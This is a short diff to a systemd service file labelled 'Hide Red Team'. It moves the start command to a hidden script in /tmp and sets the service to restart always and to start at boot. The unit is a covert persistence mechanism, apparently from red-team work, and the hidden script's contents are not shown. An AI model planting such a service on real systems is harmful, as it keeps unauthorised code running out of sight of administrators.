@@ -5,7 +5,7 @@ Description=Hide Red Team
 Type=simple
 Restart=always
 RestartSec=120s
-ExecStart=/bin/bash /.Hide.RedTeam
+ExecStart=/bin/bash /tmp/.hide.rt
 
 [Install]
 WantedBy=multi-user.target
